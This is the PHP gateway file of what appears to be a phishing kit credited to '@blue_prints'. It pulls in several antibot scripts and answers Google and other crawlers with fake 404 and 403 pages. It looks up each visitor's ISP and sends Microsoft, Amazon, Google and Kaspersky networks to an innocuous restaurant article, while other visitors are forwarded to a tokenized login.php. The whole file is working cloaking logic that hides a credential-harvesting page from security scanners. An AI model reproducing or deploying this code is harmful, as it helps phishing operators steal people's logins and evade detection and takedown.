<?php
session_start();
$useragent = $_SERVER['HTTP_USER_AGENT'];
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include 'blueprint/antbots/crawler.php';
include 'killbot/code/include.php';
include 'killbot/code/include.php';
include 'blueprint/antbots/boting.php';
include 'blueprint/antbots/myz.php';
include 'bot_fucker/wrd.php';
include 'bot_fucker/bot.php';
require_once 'huehuehue.php';
include 'step/conf/config.php';
@require("blueprint/antbots/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;  
$CrawlerDetect = new CrawlerDetect;
if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
// ------------------------------------------------- //
  #               BY: @blue_prints                #
  #         developed by blue_prints              #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//
$client  = @$_SERVER["HTTP_CLIENT_IP"];
$forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
$remote  = @$_SERVER["REMOTE_ADDR"];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION["_ip_"]  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION["_ip_"]  = $forward;
}
else{
    $_SESSION["_ip_"]  = $remote;
}
$getdetails = "https://extreme-ip-lookup.com/json/" . $_SESSION["_ip_"];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION["isp"] = $isp   = $details->isp;
if($_SESSION["isp"] == "Microsoft Corporation" || $_SESSION["isp"] == "Amazon.com"  || $_SESSION["isp"] == "SoftLayer Technologies Inc." || $_SESSION["isp"] == "Google LLC" || $_SESSION["isp"] == "Kvchosting.com LLC" || $_SESSION["isp"] == "Kaspersky Lab AO" || $_SESSION["isp"] == "Amazon Technologies Inc." || $_SESSION["isp"] == "Amazon Technologies Inc.") {	
        header("Location: https://www.thebalancesmb.com/how-to-open-a-new-restaurant-2888644");
		  }
 else {
  $key = substr(sha1(mt_rand()),1,25);
  $_SESSION['rand'] = $key;
  header("Location: login.php?token=".$_SESSION['rand']);
 }
?>
  